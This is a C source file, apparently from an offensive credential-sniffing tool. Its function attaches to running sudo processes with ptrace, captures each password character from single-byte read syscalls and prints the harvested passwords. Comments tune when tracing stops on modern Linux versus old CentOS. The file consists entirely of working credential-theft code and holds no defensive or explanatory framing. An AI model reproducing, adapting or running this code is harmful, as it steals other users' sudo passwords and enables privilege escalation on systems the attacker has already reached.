#include <sys/ptrace.h>
#include <bits/types.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define FILE_SUDO_TRACER 1
#include "config.h"
#include "helpers.h"
#include "tracers.h"

extern pid_t process_pid;
extern char *process_name;
extern char *process_path;
extern char *process_username;


void intercept_sudo(pid_t traced_process) {
  int status = 0;
  int syscall = 0;
  int i = 0;
  long length = 0;
  char *read_string = NULL;
  char *password = NULL;
  struct user_regs_struct regs;

  password = (char *) calloc(sizeof(char) * MAX_PASSWORD_LEN + 1, 1);

  if (!password)
    goto exit_sudo;

  memset(&regs, 0, sizeof(regs));
  ptrace(PTRACE_ATTACH, traced_process, NULL, &regs);
  waitpid(traced_process, &status, 0);

  if (!WIFSTOPPED(status))
    goto exit_sudo;

  ptrace(PTRACE_SETOPTIONS, traced_process, 0, PTRACE_O_TRACESYSGOOD);

  while(1) {
    if (wait_for_syscall(traced_process) != 0)
      break;

    syscall = get_syscall(traced_process);

    // Stop tracing the process after pipe2 or select. On modern Linux we
    // can wait for clone, but old versions of CentOS call clone
    // repeatedly before the password is captured. Instead we wait for
    // pipe2 on modern Linux and select on old CentOS, which occur shortly
    // after the password is captured. Commands like sudo su or sudo bash
    // could keep this process open for a while
    if (syscall == SYSCALL_pipe2 || syscall == SYSCALL_select)
      goto exit_sudo;

    if (syscall == SYSCALL_read) {
      /*
        SECURITY NOTE: get_syscall_arg is controlled by the user, this
        can be larger than the actual buffer and cause a segmentation
        fault in plistener. For example read(0, buf[4], 0xffffffff). This
        shouldn't matter here because we are only concerned with grabbing
        a single character but using this pattern with a dynamic length
        could be an issue.
      */
      length = get_syscall_arg(traced_process, 2);

      if (length == 1) {

        read_string = extract_read_string(traced_process, length);

        if (read_string[0] && i < MAX_PASSWORD_LEN) {
          password[i++] = read_string[0];
        } else {
          if (i && strnascii(password, i)) {
            output("%s\n", password);
          }
          memset(password, 0, MAX_PASSWORD_LEN);
          i = 0;
        }
        free(read_string);
        read_string = NULL;
      }
    } else if (i) { // needed for CentOS/RHEL
      if (strnascii(password, i))
        output("%s\n", password);
      memset(password, 0, MAX_PASSWORD_LEN);
      i = 0;
    }

    if (wait_for_syscall(traced_process) != 0)
      break;
  }

  if (i && i < MAX_PASSWORD_LEN && strnascii(password, i))
    output("%s\n", password);

exit_sudo:
  free(password);
  free_process_name();
  free_process_username();
  free_process_path();
  ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
  exit(0);
}
